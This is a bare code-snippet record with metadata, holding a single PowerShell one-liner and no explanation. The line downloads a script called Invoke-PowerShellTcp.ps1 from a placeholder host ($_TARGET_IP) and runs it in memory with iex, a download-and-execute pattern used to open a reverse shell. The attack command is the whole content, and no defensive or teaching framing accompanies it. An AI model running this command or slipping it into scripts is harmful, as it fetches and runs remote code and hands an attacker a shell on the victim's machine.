---
id: 5cee661d-de77-47c6-90e0-1b8e1055114e
type: code
language: Powershell
verified: false
created_at: '2020-03-23T01:30:08.327929+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
---

# Code Snippet 5cee661d

**Language**: Powershell

```powershell
iex (New-Object Net.WebClient).downloadString('http://$_TARGET_IP/Invoke-PowerShellTcp.ps1')
```
